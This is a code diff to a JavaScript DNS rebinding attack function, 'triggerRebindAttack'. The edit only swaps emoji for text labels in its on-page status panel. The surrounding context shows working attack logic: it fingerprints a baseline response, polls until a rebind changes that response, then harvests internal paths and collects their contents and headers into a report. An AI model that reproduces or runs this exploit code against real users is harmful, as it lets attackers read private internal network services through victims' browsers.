@@ -96,7 +96,7 @@ export async function triggerRebindAttack(options = {}) {
         'position:fixed;top:10px;left:10px;z-index:2147483645;background:rgba(0,0,0,0.85);color:#0f0;' +
         'font-family:monospace;font-size:11px;padding:8px;border-radius:4px;max-width:450px;max-height:300px;' +
         'overflow-y:auto;white-space:pre-wrap;word-break:break-all;';
-    panel.innerHTML = '🔍 DNS Rebinding Probe Active...<br>';
+    panel.innerHTML = '[PROBE] DNS Rebinding Probe Active...<br>';
     document.body.appendChild(panel);
 
     // --- 1. Establish baseline fingerprint ---
@@ -110,10 +110,10 @@ export async function triggerRebindAttack(options = {}) {
         });
         baselineFingerprint = await getResponseFingerprint(resp);
         log(`Baseline fingerprint: ${JSON.stringify(baselineFingerprint)}`);
-        panel.innerHTML += `📌 Baseline: status ${baselineFingerprint.status}, Content-Type: ${baselineFingerprint.contentType}<br>`;
+        panel.innerHTML += `[BASELINE] Baseline: status ${baselineFingerprint.status}, Content-Type: ${baselineFingerprint.contentType}<br>`;
     } catch (e) {
         log(`Failed to fetch baseline: ${e.message}`);
-        panel.innerHTML += `❌ Cannot establish baseline – aborting.<br>`;
+        panel.innerHTML += `[ERROR] Cannot establish baseline – aborting.<br>`;
         setTimeout(() => panel.remove(), 5000);
         return {
             stop() { abort = true; },
@@ -138,15 +138,15 @@ export async function triggerRebindAttack(options = {}) {
             if (!fingerprintsEqual(baselineFingerprint, currentFingerprint)) {
                 rebindDetected = true;
                 log('DNS REBIND DETECTED – response fingerprint changed!');
-                panel.innerHTML += `⚠️ REBIND DETECTED at ${new Date().toISOString()}<br>`;
+                panel.innerHTML += `[WARNING] REBIND DETECTED at ${new Date().toISOString()}<br>`;
                 if (onDetectRebind) try { onDetectRebind(); } catch (_) { }
                 break;
             }
-            panel.innerHTML += `⏳ Probe: response unchanged<br>`;
+            panel.innerHTML += `[PROBE] Probe: response unchanged<br>`;
         } catch (e) {
             // Network error might also indicate a change (e.g., connection refused)
             log(`Probe error: ${e.message}. Could indicate rebind to non‑HTTP service.`);
-            panel.innerHTML += `⚠️ Probe error – possible rebind.<br>`;
+            panel.innerHTML += `[WARNING] Probe error – possible rebind.<br>`;
             rebindDetected = true;
             break;
         }
@@ -157,7 +157,7 @@ export async function triggerRebindAttack(options = {}) {
     if (rebindDetected && !abort) {
         log('Harvesting internal resources...');
         if (onProgress) onProgress('harvesting', 'Fetching internal paths');
-        panel.innerHTML += `🔎 Harvesting internal resources...<br>`;
+        panel.innerHTML += `[HARVEST] Harvesting internal resources...<br>`;
 
         for (const path of internalPaths) {
             if (abort) break;
@@ -178,12 +178,12 @@ export async function triggerRebindAttack(options = {}) {
                     headers: Object.fromEntries(resp.headers.entries()),
                 };
                 harvestResults.push(entry);
-                const line = `${resp.ok ? '🟢' : '🔴'} ${path} → ${resp.status} (${content.length} bytes)`;
+                const line = `${resp.ok ? '[+]' : '[-]'} ${path} → ${resp.status} (${content.length} bytes)`;
                 panel.innerHTML += line + '<br>';
                 log(line);
             } catch (err) {
                 harvestResults.push({ url, error: err.message });
-                panel.innerHTML += `❌ ${path} → ${err.message}<br>`;
+                panel.innerHTML += `[ERR] ${path} → ${err.message}<br>`;
                 log(`Error harvesting ${path}: ${err.message}`);
             }
             panel.scrollTop = panel.scrollHeight;
@@ -193,7 +193,7 @@ export async function triggerRebindAttack(options = {}) {
 
     // Finalize
     const finalElapsed = performance.now() - startTime;
-    panel.innerHTML += `<br>✅ Done. Rebind: ${rebindDetected}, Resources harvested: ${harvestResults.length}<br>`;
+    panel.innerHTML += `<br>[DONE] Done. Rebind: ${rebindDetected}, Resources harvested: ${harvestResults.length}<br>`;
     setTimeout(() => panel.remove(), 10000);
 
     const finalReport = {
